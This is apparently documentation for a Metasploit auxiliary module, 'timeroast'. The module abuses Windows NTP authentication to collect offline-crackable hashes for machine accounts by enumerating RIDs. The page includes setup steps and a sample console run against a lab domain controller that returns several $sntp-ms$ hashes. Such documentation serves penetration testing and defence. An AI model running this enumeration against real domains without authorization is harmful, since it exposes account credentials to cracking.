## Vulnerable Application
Windows authenticates NTP requests by calculating the message digest using the NT hash followed by the first
48 bytes of the NTP message (all fields preceding the key ID). An attacker can abuse this to recover hashes
that can be cracked offline for machine and trust accounts. The attacker must know the accounts RID, but
because RIDs are sequential, they can easily be enumerated.

## Verification Steps

1. Setup a Windows domain controller target
1. Start msfconsole
1. Use the `auxiliary/admin/dcerpc/samr_account` module to create a new computer account with the `ADD_COMPUTER` action
   1. Note the RID (the last part of the SID) and password of the new account
1. Use the `auxiliary/scanner/ntp/timeroast` module
1. Set the `RHOSTS` option to the target domain controller
1. Set the `RIDS` option to the RID of the new account
1. Run the module and see that a hash is collected, this has will show up in the output of the `creds` command if a
  database is connected

## Options

### RIDS
The RIDs to enumerate (e.g. 1000-2000). Multiple values and ranges can be specified using a comma as a separator.

## Scenarios

### Windows 2019 x64 Domain Controller

```
msf6 auxiliary(scanner/ntp/timeroast) > set RIDS 4200-4205
RIDS => 4200-4205
msf6 auxiliary(scanner/ntp/timeroast) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(scanner/ntp/timeroast) > run
[*] Checking RID: 4200
[*] Checking RID: 4201
[+] Hash for RID: 4201 - 4201:$sntp-ms$74e3c4ac73afe868119ff98613888d48$1c0100e900000000000a2c704c4f434ceb0aaf8ac9813bd40000000000000000eb0aea216d99a558eb0aea216d99e010
[*] Checking RID: 4202
[+] Hash for RID: 4202 - 4202:$sntp-ms$e106388a43f6bbd5365e3a6f2dee741d$1c0100e900000000000a2c704c4f434ceb0aaf8ac78c5c9a0000000000000000eb0aea21bb83de46eb0aea21bb8442f0
[*] Checking RID: 4203
[*] Checking RID: 4204
[+] Hash for RID: 4204 - 4204:$sntp-ms$d0b1961cc3d57a1eaa40bfeeb9f30eb9$1c0100e900000000000a2c704c4f434ceb0aaf8ac653c2f50000000000000000eb0aea222a6c25c3eb0aea222a6c6a8c
[*] Checking RID: 4205
[*] Waiting on 3 pending responses...
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ntp/timeroast) >
```
